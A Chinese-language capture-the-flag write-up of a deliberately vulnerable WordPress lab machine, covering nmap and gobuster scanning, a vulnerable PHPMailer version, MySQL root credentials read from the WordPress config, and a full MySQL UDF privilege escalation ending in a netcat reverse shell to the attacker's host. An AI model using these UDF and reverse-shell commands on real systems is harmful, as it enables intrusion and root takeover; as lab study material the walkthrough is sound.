难度：

目标：

  • 获得root权限
  • 拿到4个flag

攻击方法：

  • 主机发现
  • 端口扫描
  • 信息收集
  • 路径爆破

  • 反弹shell

  • 本地信息收集
  • MySQL UDF提权

2. 渗透

2.1. 主机发现、端口扫描、端口服务发现

sudo arp-scan -l 
sudo nmap -p- 10.0.2.28
sudo nmap -p22,80,111,39505 -A 10.0.2.28

这里111端口上的服务是rpcbind，这是存在漏洞的，不过是拒绝服务的漏洞，对get shell和提权都没有帮助。

2.2. 访问http服务

在网站主页面进行功能点检测的时候发现了一个域名：raven.local，将其加入到/etc/hosts下。之后就没有其他发现了。

进行路径扫描： 

gobuster dir -u http://10.0.2.28/ -w /usr/share/dirb/wordlists/common.txt

css, fonts, img, js, manual 都没有用，vendor下面有着许多的文件，wordpress告诉我们这个网站的CMS

然后利用wpscan对wordpress进行了扫描，发现了两个用户 michael 和 steven，然后又找到了后台登录界面

尝试爆破也没有用。wp-content和wp-includes目录下也存在着多个问价，但是都没有有用的信息。

接下来看最开始的vendor目录。

首先发现了一个 PHPMailerAutoload.php 但是php文件都被解析执行了，我们看不到其代码。但是可以搜索phpmailer，并且这具有漏洞

又从 VERSION 中发现版本是 5.2.16。该漏洞的是因为调用了phpmailer的函数，所以我们需要找到是哪个文件调用了。再次进行路径扫描，这回添加了压缩拓展名，因为php的我们看不了，

发现了contact.php和contact.zip，将后者下载打开，在其中发现了

此时可以确定是contact.php调用了phpmailer。

最后，从PATH文件中发现了第一个flag，以及文件路径： 

/var/www/html/vendor/
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}

2.4. 权限提升

介绍一款信息收集的工具：GitHub - rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks

将 LinEnum.sh 传送到靶机，并执行。查看信息内容的时候发现了mysql，并且是root权限

接下来查看配置信息，获得其用户名和密码

查看其内容 

/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

然后尝试连接MySQL，利用 system /bin/bash -i 获得shell，但是失败了

查看MySQL的sucure_file_priv参数，发现没有任何限制 

mysql> show variables like "secure_file_priv";
show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.00 sec)

因此接下来利用UDF提权。[[Linux MySQL提权总结]]

  1. 在kali上找到so文件，注意靶机是64位的

    1. find / -iname "*mysqludf*" -type f 2>/dev/null
2. cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so ./udf.so

  2. 将so文件传给靶机/tmp目录下，并给权限，直接777

    1. 靶机: nc -lvnp 3333 > udf.so
2. kali: nc 10.0.2.28 3333 < udf.so -w 1
3. 靶机: chmod 777 udf.so

  3. 找MySQL插件目录

    mysql> show variables like "%plugin%";
show variables like "%plugin%";
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)

  4. 将udf.so写入插件所在目录

    失败的尝试： 

    select hex(load_file('/tmp/udf.so')) into dumpfile '/usr/lib/mysql/plugin/udf.so';

    成功的尝试： 

    1. use mysql;
2. create table shell(lint blob);
3. insert into shell values(load_file('/tmp/udf.so'));
4. select * from shell into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';

  5. 创建自定义函数

    1. reate function sys_eval returns integer soname 'mysqludf.so';
2. select sys_eval('id > /tmp/out.txt');

如果/tmp/out.txt成功生成，并且属主为root，则代表成功

即使执行函数出现了报错，还是不影响。

因此，直接利用该函数获得shell 

select sys_eval('bash -i'); # 失败，会断开连接
select sys_eval('nc 10.0.2.27 5555 -e /bin/bash'); # 成功
